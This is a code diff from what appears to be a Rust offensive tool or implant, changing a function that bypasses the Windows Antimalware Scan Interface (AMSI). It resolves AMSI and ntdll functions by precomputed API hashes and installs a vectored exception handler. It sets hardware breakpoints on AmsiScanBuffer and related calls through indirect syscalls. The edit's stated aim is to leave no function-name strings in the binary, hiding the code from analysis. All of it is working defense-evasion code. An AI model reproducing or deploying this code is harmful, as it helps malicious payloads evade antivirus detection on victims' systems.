@@ -17,7 +17,7 @@ static mut AMSI_OPEN_SESSION_ADDR: usize = 0;
 
 #[cfg(target_os = "windows")]
 pub unsafe fn install_amsi_bypass() {
-    use crate::resolve::api_hash::{djb2_hash, djb2_hash_lower, peb_get_module_base, resolve_by_hash};
+    use crate::resolve::api_hash::{djb2_hash_lower, peb_get_module_base, resolve_by_hash};
 
     const AMSI_H: u32 = djb2_hash_lower(b"amsi.dll");
 
@@ -44,26 +44,27 @@ pub unsafe fn install_amsi_bypass() {
         h
     };
 
-    // Resolve AMSI functions by hash — no plaintext names in IAT.
-    AMSI_ADDR = match resolve_by_hash(amsi_base, djb2_hash(b"AmsiScanBuffer")) {
+    use crate::resolve::api_hash::h;
+    // Resolve AMSI functions by pre-computed hash — no name strings in binary.
+    AMSI_ADDR = match resolve_by_hash(amsi_base, h::AMSI_SCAN_BUF) {
         Some(p) => p as usize,
         None    => return,
     };
-    AMSI_SCAN_STRING_ADDR = match resolve_by_hash(amsi_base, djb2_hash(b"AmsiScanString")) {
+    AMSI_SCAN_STRING_ADDR = match resolve_by_hash(amsi_base, h::AMSI_SCAN_STR) {
         Some(p) => p as usize,
         None    => 0,
     };
-    AMSI_OPEN_SESSION_ADDR = match resolve_by_hash(amsi_base, djb2_hash(b"AmsiOpenSession")) {
+    AMSI_OPEN_SESSION_ADDR = match resolve_by_hash(amsi_base, h::AMSI_OPEN_SES) {
         Some(p) => p as usize,
         None    => 0,
     };
 
-    use crate::evasion::syscalls::{get_ssn, indirect_syscall};
+    use crate::evasion::syscalls::{get_ssn_h, indirect_syscall};
     #[cfg(target_arch = "x86_64")]
     {
-        use crate::resolve::api_hash::{djb2_hash, djb2_hash_lower, peb_get_module_base, resolve_by_hash};
+        use crate::resolve::api_hash::{djb2_hash_lower, peb_get_module_base, resolve_by_hash};
         let ntdll = peb_get_module_base(djb2_hash_lower(b"ntdll.dll"));
-        if let Some(fn_ptr) = resolve_by_hash(ntdll, djb2_hash(b"RtlAddVectoredExceptionHandler")) {
+        if let Some(fn_ptr) = resolve_by_hash(ntdll, h::RTL_VEH) {
             type RtlVeh = unsafe extern "system" fn(usize, *const core::ffi::c_void) -> *mut core::ffi::c_void;
             let f: RtlVeh = core::mem::transmute(fn_ptr);
             f(1, amsi_veh_handler as usize as *const core::ffi::c_void);
@@ -75,7 +76,7 @@ pub unsafe fn install_amsi_bypass() {
     let thread: isize = !1isize; // -2 = current thread pseudo-handle
     let mut ctx: CONTEXT = core::mem::zeroed();
     ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS_AMD64;
-    if let Some((ssn_get, tramp_get)) = get_ssn(b"NtGetContextThread") {
+    if let Some((ssn_get, tramp_get)) = get_ssn_h(h::NT_GET_CTX) {
         indirect_syscall(ssn_get, tramp_get, thread as usize, &mut ctx as *mut CONTEXT as usize, 0, 0, 0, 0);
     }
     ctx.Dr0  = AMSI_ADDR as u64;
@@ -88,7 +89,7 @@ pub unsafe fn install_amsi_bypass() {
         ctx.Dr3  = AMSI_OPEN_SESSION_ADDR as u64;
         ctx.Dr7 |= 0x40;
     }
-    if let Some((ssn_set, tramp_set)) = get_ssn(b"NtSetContextThread") {
+    if let Some((ssn_set, tramp_set)) = get_ssn_h(h::NT_SET_CTX) {
         indirect_syscall(ssn_set, tramp_set, thread as usize, &ctx as *const CONTEXT as usize, 0, 0, 0, 0);
     }
 }
